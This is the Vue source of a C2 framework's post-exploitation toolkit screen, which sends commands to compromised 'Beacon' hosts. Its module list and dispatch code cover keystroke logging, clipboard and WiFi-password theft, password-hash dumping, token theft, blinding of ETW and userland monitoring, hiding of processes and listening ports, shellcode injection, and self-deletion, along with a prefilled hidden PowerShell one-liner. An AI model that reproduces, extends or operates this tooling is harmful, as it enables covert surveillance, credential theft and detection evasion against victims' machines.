<template>
  <div class="cs-tools-view cs-font-ui">
    <!-- CS Toolbar -->
    <div class="ct-toolbar">
      <div class="ct-title-group">
        <span class="ct-title">{{ i18nStore.tl('后渗透工具箱: ', 'Post-Exploitation Toolkit: ') }}{{ currentClientTitle }}</span>
        <span class="ct-count">({{ i18nStore.tl(`共 ${toolList.length} 个功能模块`, `${toolList.length} modules available`) }})</span>
      </div>

      <div class="ct-spacer" />

      <el-input
        v-model="searchKeyword"
        :placeholder="i18nStore.tl('过滤模块名称...', 'Filter module name...')"
        clearable
        class="ct-search"
      />
    </div>

    <!-- 操作条（vshell：操作集中在内容上方） -->
    <div class="ct-action-bar">
      <span class="ct-selected-hint">
        {{ selectedTool
          ? `${toolName(selectedTool)} (${toolCategory(selectedTool)})`
          : (i18nStore.tl('未选择模块', 'No module selected')) }}
      </span>

      <div class="ct-spacer" />

      <button
        class="cs-btn cs-btn-primary"
        :disabled="!selectedTool || !!loading"
        @click="executeSelectedTool"
      >
        {{ loading ? (i18nStore.tl('执行中...', 'Executing...')) : (i18nStore.tl('执行', 'Execute')) }}
      </button>

      <button
        v-if="selectedTool && selectedTool.id === 'keylog'"
        class="cs-btn"
        @click="runTool('keylog_get')"
      >
        {{ i18nStore.tl('获取击键记录', 'Get Keystrokes') }}
      </button>

      <button
        v-if="selectedTool && selectedTool.id === 'keylog'"
        class="cs-btn cs-btn-danger"
        @click="runTool('keylog_stop')"
      >
        {{ i18nStore.tl('停止键盘记录', 'Stop Keylogger') }}
      </button>

      <button
        v-if="selectedTool && selectedTool.id === 'hideprocess'"
        class="cs-btn"
        @click="runTool('hideprocess off')"
      >
        {{ i18nStore.tl('恢复进程名', 'Restore Process Name') }}
      </button>

      <button
        v-if="selectedTool && selectedTool.id === 'hidenet'"
        class="cs-btn cs-btn-danger"
        @click="runTool('hidenet off')"
      >
        {{ i18nStore.tl('停止隐藏端口', 'Stop Hide Port') }}
      </button>

      <button class="cs-btn" @click="handleHelp">
        {{ i18nStore.tl('帮助', 'Help') }}
      </button>
    </div>

    <!-- Master-Detail Split Workspace -->
    <div class="ct-split-body">
      <!-- Left Master List (CS Session Table Style) -->
      <div class="ct-left-panel">
        <el-table
          :data="filteredToolList"
          size="small"
          height="100%"
          highlight-current-row
          class="cs-session-table"
          @current-change="onSelectTool"
        >
          <el-table-column prop="name" :label="i18nStore.tl('功能模块', 'Module')" width="164" sortable show-overflow-tooltip>
            <template #default="{ row }">
              <span class="tool-name font-bold">{{ toolName(row) }}</span>
            </template>
          </el-table-column>
          <el-table-column prop="category" :label="i18nStore.tl('分类', 'Category')" width="96" sortable align="center">
            <template #default="{ row }">
              <span class="category-badge">{{ toolCategory(row) }}</span>
            </template>
          </el-table-column>
          <!-- 功能说明：不省略、整段换行显示（宽度已按最长中文说明留足） -->
          <el-table-column prop="desc" :label="i18nStore.tl('功能说明', 'Description')" min-width="300">
            <template #default="{ row }">
              <span class="tool-desc text-dim">{{ toolDesc(row) }}</span>
            </template>
          </el-table-column>
        </el-table>
      </div>

      <!-- Right Detail & Param Form + Output Terminal -->
      <div class="ct-right-panel">
        <div v-if="selectedTool" class="ct-config-card">
          <div class="ct-card-header">
            <span class="header-title">{{ toolName(selectedTool) }} ({{ toolCategory(selectedTool) }})</span>
            <span class="header-desc">{{ toolDesc(selectedTool) }}</span>
          </div>

          <div class="ct-card-form">
            <!-- Dynamic Param Form based on selectedTool.id -->
            <div v-if="selectedTool.id === 'services' || selectedTool.id === 'service_stop'" class="cs-form-row">
              <label class="cs-form-label">{{ i18nStore.tl('服务名称 (可选):', 'Service Name (optional):') }}</label>
              <el-input v-model="serviceName" placeholder="e.g. Spooler, W32Time" style="width: 240px" />
            </div>

            <div v-else-if="selectedTool.id === 'reg_query'" class="cs-form-row">
              <label class="cs-form-label">{{ i18nStore.tl('注册表路径:', 'Registry Key Path:') }}</label>
              <el-input v-model="regPath" placeholder="HKCU\Software\Microsoft\Windows\CurrentVersion\Run" style="width: 400px" />
            </div>

            <div v-else-if="selectedTool.id === 'hideprocess'" class="cs-form-row">
              <label class="cs-form-label">{{ i18nStore.tl('伪装进程名:', 'Masquerade Name:') }}</label>
              <el-input v-model="fakeName" placeholder="systemd" style="width: 240px" />
            </div>

            <div v-else-if="selectedTool.id === 'hidenet'" class="cs-form-row">
              <label class="cs-form-label">{{ i18nStore.tl('隐藏端口 (1-65535):', 'Port to Hide (1-65535):') }}</label>
              <el-input v-model="hidePort" placeholder="4444" style="width: 160px" />
            </div>

            <div v-else class="ct-no-params">
              <span class="cs-font-mono text-dim">{{ i18nStore.tl('无需额外参数，点击【执行】即可下发指令。', 'No extra parameters required. Click Execute to issue command.') }}</span>
            </div>
          </div>
        </div>

        <div v-else class="ct-empty-selection">
          <div class="ct-empty-icon">🧰</div>
          <div class="ct-empty-text">{{ i18nStore.tl('请从左侧列表选择一个后渗透模块进行配置与执行。', 'Select a post-exploitation module from the left list to configure and execute.') }}</div>
        </div>

        <!-- Terminal Output Area -->
        <div class="ct-output-header">
          <span>{{ i18nStore.tl('执行控制台日志', 'Execution Console Log') }}</span>
          <button class="cs-btn cs-btn-xs" @click="consoleLogs = []">{{ i18nStore.tl('清空', 'Clear') }}</button>
        </div>
        <div class="ct-output-console cs-font-mono" v-loading="!!loading">
          <div v-for="(log, i) in consoleLogs" :key="i" class="log-line">
            <span class="log-time">[{{ log.time }}]</span>
            <span class="log-tag" :class="log.type">[{{ log.type.toUpperCase() }}]</span>
            <span class="log-msg">{{ log.msg }}</span>
          </div>
          <div v-if="!consoleLogs.length" class="empty-log">
            {{ i18nStore.tl('就绪等待执行。输出结果将在此处及 Beacon 控制台同步展示。', 'Ready for execution. Output results will stream here and to Beacon Console.') }}
          </div>
        </div>
      </div>
    </div>

    <!-- P3：页面内局部弹窗（替代原全局 workspace.dialogs 状态机） -->
    <ProcessMigrateDialog v-model="migrateDlg.visible" :uid="migrateDlg.uid" :pid="migrateDlg.pid" />
    <BinExecuteDialog v-model="binExecDlg.visible" :uid="binExecDlg.uid" :mode="binExecDlg.mode" />

    <!-- P4：会话内对抗开关（运行期覆盖，见 components/Opsec/OpsecSwitches.vue） -->
    <el-dialog
      v-model="opsecDlg.visible"
      :title="i18nStore.tl('会话内对抗开关', 'Runtime Evasion Switches')"
      width="640px"
      append-to-body
    >
      <OpsecSwitches :uid="opsecDlg.uid" />
    </el-dialog>
  </div>
</template>

<script setup lang="ts">
import { computed, inject, ref } from 'vue'
import type { ComputedRef, Ref } from 'vue'
import { useRoute } from 'vue-router'
import { ElMessage, ElMessageBox } from 'element-plus'
import ClientAPI from '@/api/clients'
import { useClientUid } from '@/utils/clientUtils'
import { useClientsStore } from '@/stores/clients'
import { useI18nStore } from '@/stores/i18n'
// P3：工具箱内的对话框改为页面内局部弹窗
import BinExecuteDialog from '@/layout/Dialogs/BinExecuteDialog.vue'
import ProcessMigrateDialog from '@/layout/Dialogs/ProcessMigrateDialog.vue'
import OpsecSwitches from '@/components/Opsec/OpsecSwitches.vue'

const i18nStore = useI18nStore()
const isZh = computed(() => i18nStore.isZh)

interface ToolItem {
  id: string
  name: string
  category: string
  desc: string
  // 中文模式下的展示文案（模块名 / 分类 / 功能说明）
  nameZh: string
  categoryZh: string
  descZh: string
}

// 中文优先：中文模式下模块名、分类、功能说明全部走 zh 字段
const toolName = (t: ToolItem | null | undefined) => (t ? (isZh.value ? t.nameZh : t.name) : '')
const toolCategory = (t: ToolItem | null | undefined) => (t ? (isZh.value ? t.categoryZh : t.category) : '')
const toolDesc = (t: ToolItem | null | undefined) => (t ? (isZh.value ? t.descZh : t.desc) : '')

interface ConsoleLog {
  time: string
  type: 'info' | 'succ' | 'warn' | 'err'
  msg: string
}

const route = useRoute()
const clientsStore = useClientsStore()

const injectedUid = inject<Ref<string> | ComputedRef<string> | null>('realUid', null)
const getUid = () => {
  const v = injectedUid && injectedUid.value ? String(injectedUid.value) : ''
  if (v && v.length > 10) return v
  const mapped = useClientUid(route)
  return typeof mapped === 'string' && mapped.length > 10 ? mapped : ''
}

const currentClientTitle = computed(() => {
  const uid = getUid()
  if (!uid) return 'Active Beacon'
  const c = clientsStore.getClientByUid(uid)
  return c ? `${c.Computer || c.Username || 'Beacon'} (${c.InternalIP || c.ExternalIP || '127.0.0.1'})` : uid.slice(0, 8)
})

const searchKeyword = ref('')
const selectedTool = ref<ToolItem | null>(null)
const loading = ref('')
const consoleLogs = ref<ConsoleLog[]>([])

const serviceName = ref('')
const regPath = ref('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run')
const fakeName = ref('systemd')
const hidePort = ref('4444')

// ---- 页面内局部弹窗状态（P3：取代 workspace.dialogs 全局状态机）----
const migrateDlg = ref({ visible: false, uid: '', pid: '' })
const binExecDlg = ref({ visible: false, uid: '', mode: '' })
const opsecDlg = ref({ visible: false, uid: '' })

const toolList = ref<ToolItem[]>([
  // ---- 信息收集 ----
  { id: 'clipboard', name: 'Clipboard Dump', category: 'Gather', desc: 'Read target user active clipboard text content', nameZh: '剪贴板提取', categoryZh: '信息收集', descZh: '读取目标用户当前剪贴板中的文本内容' },
  { id: 'wifi', name: 'WiFi Passwords', category: 'Credentials', desc: 'Extract stored WiFi profile names and cleartext passwords', nameZh: 'WiFi 密码', categoryZh: '凭据', descZh: '提取已保存的 WiFi 配置名称与明文口令' },
  // ---- 监视 ----
  { id: 'keylog', name: 'Keystroke Logger', category: 'Spying', desc: 'Capture keyboard inputs (Windows API Hook / Linux input device)', nameZh: '键盘记录', categoryZh: '监视', descZh: '捕获键盘输入（Windows API 钩子 / Linux 输入设备）' },
  // ---- 系统 ----
  { id: 'services', name: 'Services Manager', category: 'System', desc: 'List, start, or stop Windows/Linux background system services', nameZh: '服务管理', categoryZh: '系统', descZh: '列出、启动或停止 Windows/Linux 后台系统服务' },
  { id: 'service_stop', name: 'Service Stop', category: 'System', desc: 'Stop a Windows service by name', nameZh: '停止服务', categoryZh: '系统', descZh: '按名称停止指定的 Windows 服务' },
  // ---- 持久化 ----
  { id: 'reg_query', name: 'Registry Query', category: 'Persistence', desc: 'Query Windows Registry key values and startup items', nameZh: '注册表查询', categoryZh: '持久化', descZh: '查询 Windows 注册表键值与自启动项' },
  // ---- 注入 ----
  { id: 'migrate', name: 'Process Migration', category: 'Injection', desc: 'In-memory injection: generate stageless shellcode and inject into a process (no disk write)', nameZh: '进程迁移', categoryZh: '注入', descZh: '内存注入：生成无阶段 shellcode 并注入目标进程（不落盘）' },
  // ---- 隐蔽 ----
  { id: 'hideprocess', name: 'Process Masquerade', category: 'Stealth', desc: 'Override process name & argv on Linux (ps/top masquerading)', nameZh: '进程伪装', categoryZh: '隐蔽', descZh: '在 Linux 上改写进程名与命令行参数（骗过 ps/top）' },
  { id: 'hidenet', name: 'Network Connection Hide', category: 'Stealth', desc: 'LD_PRELOAD /proc/net hook to hide active listening port', nameZh: '网络连接隐藏', categoryZh: '隐蔽', descZh: 'LD_PRELOAD 挂钩 /proc/net，隐藏正在监听的端口' },
  // ---- 规避 ----
  { id: 'selfdelete', name: 'Self Delete / Wipe', category: 'Evasion', desc: 'Permanently remove beacon binary from disk and terminate', nameZh: '自删除 / 抹除', categoryZh: '规避', descZh: '从磁盘永久删除 Beacon 本体并终止进程' },
  { id: 'etw_patch', name: 'ETW Patch', category: 'Evasion', desc: 'Patch Event Tracing for Windows to blind ETW-based detection', nameZh: 'ETW 补丁', categoryZh: '规避', descZh: '修补 Windows 事件追踪，致盲基于 ETW 的检测' },
  { id: 'unhook_ntdll', name: 'Unhook NTDLL', category: 'Evasion', desc: 'Restore ntdll.dll hooks/patches to bypass userland monitoring', nameZh: '解除 NTDLL 钩子', categoryZh: '规避', descZh: '还原 ntdll.dll 中的钩子与补丁，绕过用户态监控' },
  { id: 'sandbox_check', name: 'Sandbox Check', category: 'Evasion', desc: 'Probe for sandbox/VM artifacts; adjust behavior accordingly', nameZh: '沙箱检测', categoryZh: '规避', descZh: '探测沙箱/虚拟机痕迹，并据此调整行为' },
  { id: 'antidebug', name: 'Anti-Debug', category: 'Evasion', desc: 'Enable anti-debugger protections (IsDebuggerPresent & friends)', nameZh: '反调试', categoryZh: '规避', descZh: '启用反调试保护（IsDebuggerPresent 等检测）' },
  // P4：会话内开关（ETW/AMSI/摘链/伪栈/PPID/BlockDLLs/unhook），免重新生成载荷
  { id: 'opsec_switches', name: 'Evasion Switches', category: 'Evasion', desc: 'Turn host-evasion capabilities on/off at runtime (no re-payload needed)', nameZh: '对抗开关', categoryZh: '规避', descZh: '运行期开关主机对抗能力（ETW/AMSI/摘链/伪栈/PPID/BlockDLLs），无需重新生成载荷' },
  // ---- 访问 ----
  { id: 'hashdump', name: 'Hash Dump', category: 'Access', desc: 'Dump local SAM/LSA password hashes (Windows)', nameZh: '哈希导出', categoryZh: '访问', descZh: '导出本地 SAM/LSA 口令哈希（Windows）' },
  { id: 'rev2self', name: 'Revert Token', category: 'Access', desc: 'Revert to the original process token', nameZh: '还原令牌', categoryZh: '访问', descZh: '回退到进程的原始访问令牌' },
  { id: 'make_token', name: 'Make Token', category: 'Access', desc: 'Create a token from plaintext credentials (prompts domain\\user, password)', nameZh: '创建令牌', categoryZh: '访问', descZh: '用明文凭据创建令牌（需输入 域\\用户 与口令）' },
  { id: 'steal_token', name: 'Steal Token', category: 'Access', desc: 'Clone a token from another process (prompts PID)', nameZh: '窃取令牌', categoryZh: '访问', descZh: '从其它进程克隆访问令牌（需输入 PID）' },
  { id: 'oneliner', name: 'PowerShell One-liner', category: 'Access', desc: 'Execute a PowerShell one-liner (prompts command)', nameZh: 'PowerShell 单行命令', categoryZh: '访问', descZh: '执行一条 PowerShell 单行命令（需输入命令内容）' },
  // ---- 侦察 ----
  { id: 'netview', name: 'Network View', category: 'Recon', desc: 'Enumerate domain computers (net view)', nameZh: '网络视图', categoryZh: '侦察', descZh: '枚举域内计算机（net view）' },
  // ---- 内存执行（打开内存执行对话框）----
  { id: 'exec_assembly', name: 'Execute Assembly', category: 'Memory Execution', desc: '.NET assembly in memory', nameZh: '执行 .NET 程序集', categoryZh: '内存执行', descZh: '在内存中加载并执行 .NET 程序集' },
  { id: 'exec_inline', name: 'Inline Bin', category: 'Memory Execution', desc: 'Other exe in memory', nameZh: '内存执行 EXE', categoryZh: '内存执行', descZh: '在内存中执行其它 EXE，不落盘' },
  { id: 'exec_shellcode', name: 'Shellcode Inject', category: 'Memory Execution', desc: 'Execute raw shellcode', nameZh: 'Shellcode 注入', categoryZh: '内存执行', descZh: '直接执行原始 shellcode' },
  { id: 'exec_bof', name: 'BOF (COFF)', category: 'Memory Execution', desc: 'Beacon Object File in memory', nameZh: 'BOF（COFF）', categoryZh: '内存执行', descZh: '在内存中执行 Beacon Object File' },
  { id: 'exec_script', name: 'Linux Script', category: 'Memory Execution', desc: 'Run script on Linux beacon', nameZh: 'Linux 脚本', categoryZh: '内存执行', descZh: '在 Linux Beacon 上运行脚本' },
  { id: 'exec_binary', name: 'Linux Binary', category: 'Memory Execution', desc: 'Run ELF binary on Linux beacon', nameZh: 'Linux 二进制', categoryZh: '内存执行', descZh: '在 Linux Beacon 上运行 ELF 二进制' },
])

const filteredToolList = computed(() => {
  if (!searchKeyword.value.trim()) return toolList.value
  const kw = searchKeyword.value.toLowerCase().trim()
  // 名称/说明/分类的中英文都参与匹配，中文模式下可用中文关键词过滤
  return toolList.value.filter((t) =>
    [t.name, t.desc, t.category, t.nameZh, t.descZh, t.categoryZh]
      .join(' ')
      .toLowerCase()
      .includes(kw),
  )
})

function onSelectTool(row: ToolItem | null) {
  selectedTool.value = row
}

const getTime = () => new Date().toLocaleTimeString('en-GB')

const addLog = (type: 'info' | 'succ' | 'warn' | 'err', msg: string) => {
  consoleLogs.value.push({ time: getTime(), type, msg })
}

const runTool = async (cmd: string) => {
  const uid = getUid()
  if (!uid) {
    ElMessage.warning('Client not ready')
    return
  }
  loading.value = cmd
  addLog('info', `Issuing task to Beacon [${uid.slice(0, 8)}]: ${cmd}`)
  try {
    await ClientAPI.send_commands({ uid, command: cmd })
    addLog('succ', `Task queued successfully: ${cmd}. See Beacon console for results.`)
    ElMessage.success(`Command "${cmd}" sent to Beacon`)
  } catch (e: any) {
    addLog('err', `Task execution failed: ${e?.message || 'Network error'}`)
    ElMessage.error('Command dispatch failed')
  } finally {
    loading.value = ''
  }
}

function executeSelectedTool() {
  if (!selectedTool.value) return
  const tool = selectedTool.value.id

  if (tool === 'clipboard') {
    runTool('clipboard')
  } else if (tool === 'wifi') {
    runTool('wifi')
  } else if (tool === 'keylog') {
    runTool('keylog_start')
  } else if (tool === 'services') {
    if (serviceName.value.trim()) {
      runTool(`service_start ${serviceName.value.trim()}`)
    } else {
      runTool('services')
    }
  } else if (tool === 'reg_query') {
    runTool(`reg_query ${regPath.value.trim()}`)
  } else if (tool === 'migrate') {
    // 内存注入迁移：打开注入迁移对话框（生成无阶段 shellcode → 内存下发 → 注入，不落盘）
    const uid = getUid()
    if (!uid) {
      ElMessage.warning(isZh.value ? '客户端未就绪' : 'Beacon session not ready')
      return
    }
    migrateDlg.value = { visible: true, uid, pid: '' }
  } else if (tool === 'hideprocess') {
    runTool(`hideprocess ${fakeName.value.trim() || 'systemd'}`)
  } else if (tool === 'hidenet') {
    const port = hidePort.value.trim()
    if (!/^\d+$/.test(port) || +port < 1 || +port > 65535) {
      ElMessage.warning('Please enter a valid port (1-65535)')
      return
    }
    runTool(`hidenet on ${port}`)
  } else if (tool === 'selfdelete') {
    ElMessageBox.confirm(
      'Permanently delete client binary from disk and terminate session? This cannot be undone.',
      'Self Delete Confirmation',
      { confirmButtonText: 'Confirm Wipe', cancelButtonText: 'Cancel', type: 'warning' },
    ).then(() => {
      runTool('selfdelete')
    }).catch(() => {})
  } else if (tool === 'etw_patch') {
    runTool('etw_patch')
  } else if (tool === 'unhook_ntdll') {
    runTool('unhook_ntdll')
  } else if (tool === 'sandbox_check') {
    runTool('sandbox_check')
  } else if (tool === 'antidebug') {
    runTool('antidebug')
  } else if (tool === 'opsec_switches') {
    const uid = getUid()
    if (!uid) {
      ElMessage.warning('Client not ready')
      return
    }
    opsecDlg.value = { visible: true, uid }
  } else if (tool === 'service_stop') {
    if (!serviceName.value.trim()) {
      ElMessage.warning('Please enter a service name')
      return
    }
    runTool(`service_stop ${serviceName.value.trim()}`)
  } else if (tool === 'hashdump' || tool === 'rev2self' || tool === 'netview') {
    runTool(tool)
  } else if (tool === 'make_token') {
    promptMakeToken()
  } else if (tool === 'steal_token') {
    promptStealToken()
  } else if (tool === 'oneliner') {
    promptOneliner()
  } else if (tool.startsWith('exec_')) {
    const modeMap: Record<string, string> = {
      exec_assembly: 'execute-assembly',
      exec_inline: 'inline-bin',
      exec_shellcode: 'shellcode-inject',
      exec_bof: 'bof',
      exec_script: 'script',
      exec_binary: 'binary',
    }
    const uid = getUid()
    if (!uid) {
      ElMessage.warning('Client not ready')
      return
    }
    binExecDlg.value = { visible: true, uid, mode: modeMap[tool] }
  }
}

// ---- 凭证操作（prompt 形态，移植自已移除的右键菜单）----
function promptMakeToken() {
  ElMessageBox.prompt(
    isZh.value ? '凭据（域\\用户）:' : 'Credentials (domain\\user):',
    isZh.value ? '生成令牌' : 'Make Token',
    { confirmButtonText: isZh.value ? '下一步' : 'Next', cancelButtonText: isZh.value ? '取消' : 'Cancel', inputValue: 'DOMAIN\\user' },
  ).then(({ value }) => {
    const user = (value || '').trim()
    if (!user) return
    ElMessageBox.prompt(
      isZh.value ? '密码:' : 'Password:',
      isZh.value ? '生成令牌' : 'Make Token',
      { confirmButtonText: isZh.value ? '生成' : 'Create', cancelButtonText: isZh.value ? '取消' : 'Cancel', inputType: 'password' },
    ).then(({ value: pwd }) => {
      runTool(`make_token ${user} ${pwd}`)
    }).catch(() => {})
  }).catch(() => {})
}

function promptStealToken() {
  ElMessageBox.prompt(
    isZh.value ? '目标进程 PID:' : 'Target process PID:',
    isZh.value ? '窃取令牌' : 'Steal Token',
    { confirmButtonText: isZh.value ? '窃取' : 'Steal', cancelButtonText: isZh.value ? '取消' : 'Cancel', inputPattern: /^\d+$/, inputErrorMessage: isZh.value ? 'PID 必须为数字' : 'PID must be numeric' },
  ).then(({ value }) => {
    runTool(`steal_token ${String(value).trim()}`)
  }).catch(() => {})
}

function promptOneliner() {
  ElMessageBox.prompt(
    isZh.value ? 'PowerShell 命令:' : 'PowerShell command:',
    isZh.value ? 'PowerShell One-liner' : 'PowerShell One-liner',
    { confirmButtonText: isZh.value ? '执行' : 'Run', cancelButtonText: isZh.value ? '取消' : 'Cancel', inputValue: 'powershell -nop -w hidden -c ' },
  ).then(({ value }) => {
    const cmd = (value || '').trim()
    if (!cmd) return
    runTool(`oneliner ${cmd}`)
  }).catch(() => {})
}

function handleHelp() {
  ElMessage.info('Post-Exploitation Modules Reference')
}
</script>

<style scoped>
.cs-tools-view {
  height: 100%;
  display: flex;
  flex-direction: column;
  background: var(--cs-bg);
  overflow: hidden;
}

.ct-toolbar {
  height: 48px;
  background: var(--cs-panel);
  border-bottom: 1px solid var(--cs-card-border);
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 0 12px;
  flex-shrink: 0;
}

.ct-title-group {
  display: flex;
  align-items: center;
  gap: 6px;
  min-width: 0;
}

.ct-title {
  font-size: 14px;
  font-weight: 600;
  color: var(--cs-text-bright);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.ct-count {
  font-size: 13px;
  color: var(--cs-text-dim);
  white-space: nowrap;
}

.ct-spacer { flex: 1; }

.ct-search { width: 220px; }

/* 操作条（vshell：操作集中在内容上方，取代原底部按钮行） */
.ct-action-bar {
  height: 48px;
  background: var(--cs-panel);
  border-bottom: 1px solid var(--cs-card-border);
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 0 12px;
  flex-shrink: 0;
}

.ct-selected-hint {
  font-size: 13px;
  color: var(--cs-text-dim);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.ct-split-body {
  flex: 1;
  display: flex;
  gap: 12px;
  padding: 12px;
  overflow: hidden;
}

.ct-left-panel {
  /* 加宽以完整显示「功能模块 / 分类 / 功能说明」三列（说明整段不省略） */
  width: clamp(480px, 46%, 660px);
  min-width: 480px;
  flex-shrink: 0;
  display: flex;
  flex-direction: column;
  background: var(--cs-card-bg);
  border: 1px solid var(--cs-card-border);
  border-radius: 8px;
  overflow: hidden;
}

.ct-right-panel {
  flex: 1;
  display: flex;
  flex-direction: column;
  background: var(--cs-card-bg);
  border: 1px solid var(--cs-card-border);
  border-radius: 8px;
  overflow: hidden;
}

.tool-name { color: var(--cs-text-bright); }

.category-badge {
  font-size: 12px;
  padding: 1px 6px;
  border-radius: 4px;
  background: color-mix(in srgb, var(--cs-active) 10%, transparent);
  color: var(--cs-active);
  font-weight: 500;
}

.text-dim {
  color: var(--cs-text-dim);
}

/* 功能说明整段展示：允许换行，不省略、不截断 */
.tool-desc {
  display: block;
  white-space: normal;
  word-break: break-word;
  line-height: 1.5;
  font-size: 12.5px;
}

.ct-config-card {
  padding: 12px 16px;
  border-bottom: 1px solid var(--cs-card-border);
  background: transparent;
}

.ct-card-header {
  display: flex;
  flex-direction: column;
  gap: 2px;
  margin-bottom: 12px;
}

.header-title {
  font-size: 14px;
  font-weight: 600;
  color: var(--cs-text-bright);
}

.header-desc {
  font-size: 13px;
  color: var(--cs-text-dim);
}

.cs-form-row {
  display: flex;
  align-items: center;
  gap: 12px;
}

.cs-form-label {
  font-size: 14px;
  color: var(--cs-text);
  flex-shrink: 0;
}

.ct-no-params {
  padding: 4px 0;
}

.ct-empty-selection {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 8px;
  padding: 24px;
  color: var(--cs-text-dim);
  font-size: 14px;
  text-align: center;
}

.ct-empty-icon {
  font-size: 40px;
  line-height: 1;
  opacity: 0.75;
}

.ct-output-header {
  height: 38px;
  background: transparent;
  border-bottom: 1px solid var(--cs-card-border);
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 12px;
  font-size: 14px;
  font-weight: 600;
  color: var(--cs-text-bright);
  flex-shrink: 0;
}

.ct-output-console {
  flex: 1;
  background: var(--cs-console);
  color: var(--cs-text);
  padding: 12px;
  overflow-y: auto;
  font-size: 13px;
  line-height: 1.6;
}

.log-line {
  display: flex;
  gap: 6px;
  margin-bottom: 2px;
}

.log-time { color: var(--cs-text-dim); }
.log-tag.info { color: var(--cs-active); }
.log-tag.succ { color: var(--cs-online); }
.log-tag.warn { color: var(--cs-warning); }
.log-tag.err { color: var(--cs-error); }
.log-msg { color: var(--cs-text-bright); }

.empty-log {
  color: var(--cs-text-dim);
  padding: 12px 0;
}
</style>
